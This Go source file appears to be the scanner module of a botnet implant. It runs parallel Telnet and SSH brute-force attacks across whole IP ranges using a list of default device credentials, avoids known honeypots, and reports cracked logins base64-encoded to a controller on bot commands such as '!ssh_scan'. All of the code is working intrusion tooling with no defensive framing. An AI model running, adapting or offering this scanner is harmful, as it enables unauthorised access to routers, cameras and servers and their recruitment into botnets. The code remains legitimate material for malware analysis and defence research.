//go:build withscanners

package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

const hasScanners = true

var (
	scannerActive int32
	scannerStopCh chan struct{}
	scannerMu     sync.Mutex
)

var defaultCreds = []string{
	"admin:admin", "root:root", "admin:password", "root:password",
	"admin:", "root:", "admin:admin123", "root:admin",
	"user:user", "support:support", "guest:guest", "test:test",
	"admin:1234", "root:1234", "admin:12345", "root:12345",
	"admin:123456", "root:123456", "pi:raspberry", "ubnt:ubnt",
	"admin:password123", "admin:pass", "admin:admin1", "root:admin123",
	"admin:system", "superadmin:superadmin", "daemon:daemon",
}

// lazarusTelnetScan runs a parallel Telnet brute-force scanner against target CIDR.
func lazarusTelnetScan(conn net.Conn, cidr string, timeoutMs int) {
	if !atomic.CompareAndSwapInt32(&scannerActive, 0, 1) {
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "Scanner is already running")))
		return
	}
	defer atomic.StoreInt32(&scannerActive, 0)

	scannerMu.Lock()
	scannerStopCh = make(chan struct{})
	stopCh := scannerStopCh
	scannerMu.Unlock()

	ips := equationExpandCIDR(cidr)
	if len(ips) == 0 {
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "Invalid target CIDR or empty IP range")))
		return
	}

	deoxys("lazarusTelnetScan: Starting Telnet scan on %d IPs in %s", len(ips), cidr)
	conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("Telnet scan started on %d targets in %s", len(ips), cidr))))

	sem := make(chan struct{}, 64)
	var hits []string
	var hitsMu sync.Mutex

	for _, ip := range ips {
		select {
		case <-stopCh:
			deoxys("lazarusTelnetScan: Scan canceled")
			return
		default:
		}

		sem <- struct{}{}
		go func(targetIP string) {
			defer func() { <-sem }()

			targetAddr := net.JoinHostPort(targetIP, "23")
			dialer := net.Dialer{Timeout: time.Duration(timeoutMs) * time.Millisecond}
			tConn, err := dialer.Dial("tcp", targetAddr)
			if err != nil {
				return
			}
			defer tConn.Close()

			tConn.SetDeadline(time.Now().Add(5 * time.Second))
			reader := bufio.NewReader(tConn)
			banner, _ := reader.ReadString(':')

			// Honeypot check
			lowerBanner := strings.ToLower(banner)
			if strings.Contains(lowerBanner, "cowrie") || strings.Contains(lowerBanner, "kippo") {
				return
			}

			// Try credentials
			for _, pair := range defaultCreds {
				parts := strings.SplitN(pair, ":", 2)
				user, pass := parts[0], parts[1]

				tConn.SetDeadline(time.Now().Add(3 * time.Second))
				tConn.Write([]byte(user + "\r\n"))
				time.Sleep(200 * time.Millisecond)

				tConn.Write([]byte(pass + "\r\n"))
				time.Sleep(300 * time.Millisecond)

				respBuf := make([]byte, 1024)
				n, _ := tConn.Read(respBuf)
				respStr := string(respBuf[:n])

				if strings.Contains(respStr, "$") || strings.Contains(respStr, "#") || strings.Contains(respStr, ">") {
					hit := fmt.Sprintf("TELNET_HIT: %s -> %s:%s", targetIP, user, pass)
					deoxys("lazarusTelnetScan: Found hit: %s", hit)
					hitsMu.Lock()
					hits = append(hits, hit)
					hitsMu.Unlock()
					break
				}
			}
		}(ip)
	}

	// Wait for active workers
	for i := 0; i < cap(sem); i++ {
		sem <- struct{}{}
	}

	if len(hits) > 0 {
		result := strings.Join(hits, "\n")
		encoded := base64.StdEncoding.EncodeToString([]byte(result))
		conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
	} else {
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Telnet scan finished: 0 hits")))
	}
}

// lazarusSSHScan runs a parallel SSH brute-force scanner against target CIDR using golang.org/x/crypto/ssh.
func lazarusSSHScan(conn net.Conn, cidr string, timeoutMs int) {
	if !atomic.CompareAndSwapInt32(&scannerActive, 0, 1) {
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "Scanner is already running")))
		return
	}
	defer atomic.StoreInt32(&scannerActive, 0)

	scannerMu.Lock()
	scannerStopCh = make(chan struct{})
	stopCh := scannerStopCh
	scannerMu.Unlock()

	ips := equationExpandCIDR(cidr)
	if len(ips) == 0 {
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "Invalid target CIDR")))
		return
	}

	deoxys("lazarusSSHScan: Starting SSH scan on %d IPs in %s", len(ips), cidr)
	conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("SSH scan started on %d targets in %s", len(ips), cidr))))

	sem := make(chan struct{}, 32)
	var hits []string
	var hitsMu sync.Mutex

	for _, ip := range ips {
		select {
		case <-stopCh:
			deoxys("lazarusSSHScan: Scan canceled")
			return
		default:
		}

		sem <- struct{}{}
		go func(targetIP string) {
			defer func() { <-sem }()

			for _, pair := range defaultCreds {
				parts := strings.SplitN(pair, ":", 2)
				user, pass := parts[0], parts[1]

				sshConfig := &ssh.ClientConfig{
					User: user,
					Auth: []ssh.AuthMethod{
						ssh.Password(pass),
					},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
					Timeout:         time.Duration(timeoutMs) * time.Millisecond,
				}

				targetAddr := net.JoinHostPort(targetIP, "22")
				client, err := ssh.Dial("tcp", targetAddr, sshConfig)
				if err == nil {
					client.Close()
					hit := fmt.Sprintf("SSH_HIT: %s -> %s:%s", targetIP, user, pass)
					deoxys("lazarusSSHScan: Found hit: %s", hit)
					hitsMu.Lock()
					hits = append(hits, hit)
					hitsMu.Unlock()
					break
				}
			}
		}(ip)
	}

	// Wait for workers
	for i := 0; i < cap(sem); i++ {
		sem <- struct{}{}
	}

	if len(hits) > 0 {
		result := strings.Join(hits, "\n")
		encoded := base64.StdEncoding.EncodeToString([]byte(result))
		conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
	} else {
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "SSH scan finished: 0 hits")))
	}
}

func lazarusScanStop() {
	scannerMu.Lock()
	defer scannerMu.Unlock()
	if scannerStopCh != nil {
		close(scannerStopCh)
		scannerStopCh = nil
	}
	atomic.StoreInt32(&scannerActive, 0)
}

func dispatchScanners(conn net.Conn, cmd string, fields []string) error {
	if len(fields) < 2 {
		return fmt.Errorf("usage: !telnet_scan <cidr> | !ssh_scan <cidr> | !stop_scan")
	}
	switch cmd {
	case "!telnet_scan":
		cidr := fields[1]
		timeoutMs := 3000
		go lazarusTelnetScan(conn, cidr, timeoutMs)
		return nil
	case "!ssh_scan":
		cidr := fields[1]
		timeoutMs := 5000
		go lazarusSSHScan(conn, cidr, timeoutMs)
		return nil
	case "!stop_scan":
		lazarusScanStop()
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Scan stopped")))
		return nil
	default:
		return fmt.Errorf("unknown scanner command")
	}
}
